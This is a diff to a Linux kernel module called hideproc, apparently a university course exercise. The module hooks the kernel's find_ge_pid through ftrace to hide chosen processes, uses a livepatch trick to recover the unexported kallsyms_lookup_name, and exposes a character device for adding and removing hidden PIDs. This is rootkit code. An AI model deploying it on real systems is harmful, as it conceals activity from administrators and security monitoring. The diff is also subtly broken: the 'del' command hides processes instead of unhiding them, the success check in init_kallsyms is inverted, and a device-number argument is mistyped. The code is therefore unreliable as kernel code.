@@ -4,26 +4,55 @@
 #include <linux/list.h>
 #include <linux/module.h>
 #include <linux/proc_fs.h>
+#include <linux/livepatch.h>
 
 MODULE_LICENSE("GPL");
 MODULE_AUTHOR("National Cheng Kung University, Taiwan");
 
 enum RETURN_CODE { SUCCESS };
 
-struct ftrace_ops {
-	ftrace_func_t			func;
-	struct ftrace_ops __rcu		*next;
-	unsigned long			flags;
-	void				*private;
-	ftrace_func_t			saved_func;
-#ifdef CONFIG_DYNAMIC_FTRACE
-	struct ftrace_ops_hash		local_hash;
-	struct ftrace_ops_hash		*func_hash;
-	struct ftrace_ops_hash		old_hash;
-	unsigned long			trampoline;
-	unsigned long			trampoline_size;
-#endif
+static struct klp_func funcs[] = {
+	{
+		.old_name = "kallsyms_lookup_name",
+		.new_func = kallsyms_lookup_name,
+	}, {}
 };
+
+static struct klp_func failfuncs[] = {
+	{
+		.old_name = "___________________",
+	}, {}
+};
+
+static struct klp_object objs[] = {
+	{
+		.funcs = funcs,
+	},
+	{
+		.name = "kallsyms_failing_name",
+		.funcs = failfuncs,
+	}, { }
+};
+
+static struct klp_patch patch = {
+	.mod = THIS_MODULE,
+	.objs = objs,
+};
+
+unsigned long kallsyms_lookup_name(const char *name)
+{
+	return ((unsigned long(*)(const char *))funcs->old_func)(name);
+}
+
+int init_kallsyms(void)
+{
+	int r = klp_enable_patch(&patch);
+
+	if (!r)
+		return -1;
+
+	return 0;
+}
 
 struct ftrace_hook {
     const char *name;
@@ -90,7 +119,6 @@ static int hook_install(struct ftrace_hook *hook)
     return 0;
 }
 
-#if 0
 void hook_remove(struct ftrace_hook *hook)
 {
     int err = unregister_ftrace_function(&hook->ops);
@@ -100,7 +128,6 @@ void hook_remove(struct ftrace_hook *hook)
     if (err)
         printk("ftrace_set_filter_ip() failed: %d\n", err);
 }
-#endif
 
 typedef struct {
     pid_t id;
@@ -139,7 +166,10 @@ static struct pid *hook_find_ge_pid(int nr, struct pid_namespace *ns)
 
 static void init_hook(void)
 {
-    real_find_ge_pid = (find_ge_pid_func) kallsyms_lookup_name("find_ge_pid");
+    if (init_kallsyms() != 0)
+        return;
+    real_find_ge_pid = kallsyms_lookup_name("find_ge_pid");
+    printk(KERN_INFO "find_ge_pid: %lx\n", real_find_ge_pid);
     hook.name = "find_ge_pid";
     hook.func = hook_find_ge_pid; /* hook function */
     hook.orig = &real_find_ge_pid; /* real function */
@@ -151,7 +181,7 @@ static int hide_process(pid_t pid)
     pid_node_t *proc = kmalloc(sizeof(pid_node_t), GFP_KERNEL);
     proc->id = pid;
     // CCC;
-    list_add_tail(proc->list_node, &hidden_proc); /* add a new node to tail of list_head */
+    list_add_tail(&proc->list_node, &hidden_proc); /* add a new node to tail of list_head */
     return SUCCESS;
 }
 
@@ -161,7 +191,7 @@ static int unhide_process(pid_t pid)
     // BBB (proc, tmp_proc, &hidden_proc, list_node) {
     list_for_each_entry_safe (proc, tmp_proc, &hidden_proc, list_node) {
         // DDD;
-        list_del(proc->list_node);
+        list_del(&proc->list_node);
         kfree(proc);
     }
     return SUCCESS;
@@ -219,11 +249,29 @@ static ssize_t device_write(struct file *filep,
     copy_from_user(message, buffer, len);
 
     if (!memcmp(message, add_message, sizeof(add_message) - 1)) { /* add <pid> */
-        kstrtol(message + sizeof(add_message), 10, &pid);
-        hide_process(pid);
+        char *pid_list = message + sizeof(add_message);
+        char **ptr = &pid_list;
+        char *cur;
+
+        while ((cur = strsep(ptr, " ")) != NULL) {
+            if (!strlen(cur))
+                continue;
+            kstrtol(cur, 10, &pid);
+            printk(KERN_INFO "[add] get pid: %ld\n", pid);
+            hide_process(pid);
+        }
     } else if (!memcmp(message, del_message, sizeof(del_message) - 1)) { /* del <pid> */
-        kstrtol(message + sizeof(del_message), 10, &pid);
-        unhide_process(pid);
+        char *pid_list = message + sizeof(del_message);
+        char **ptr = &pid_list;
+        char *cur;
+
+        while ((cur = strsep(ptr, " ")) != NULL) {
+            if (!strlen(cur))
+                continue;
+            kstrtol(cur, 10, &pid);
+            printk(KERN_INFO "[del] get pid: %ld\n", pid);
+            hide_process(pid);
+        }
     } else {
         kfree(message);
         return -EAGAIN;
@@ -234,6 +282,7 @@ static ssize_t device_write(struct file *filep,
     return len;
 }
 
+static dev_t dev;
 static struct cdev cdev;
 static struct class *hideproc_class = NULL;
 
@@ -251,7 +300,6 @@ static const struct file_operations fops = {
 static int _hideproc_init(void) /* init_function */
 {
     int err, dev_major;
-    dev_t dev;
     printk(KERN_INFO "Init @ %s\n", __func__);
 
     /* alloc_chrdev_region - register a range of char device numbers */
@@ -275,11 +323,21 @@ static int _hideproc_init(void) /* init_function */
     return 0;
 }
 
+/**
+ * _hideproc_exit() - reset ftrace hook and clear device
+ */
 static void _hideproc_exit(void)
 {
     printk(KERN_INFO "@ %s\n", __func__);
-    /* FIXME: ensure the release of all allocated resources */
+    hook_remove(&hook); /* remove ftrace hook */
+    /* removes a device that was created with device_create() */
+    device_destroy(hideproc_class, MKDEV(MAJOR(dev), MINOR_VERSION));
+    cdev_del(&cdev); /* remove a cdev from the system */;
+    class_destroy(hideproc_class); /* destroys a struct class structure */
+    /* unregister a range of device numbers */
+    unregister_chrdev_region(&dev, MINOR_VERSION);
 }
 
 module_init(_hideproc_init); /* set function _hideproc_init as init_function */
 module_exit(_hideproc_exit); /* set function _hideproc_exit as exit_function */
+MODULE_INFO(livepatch, "Y");
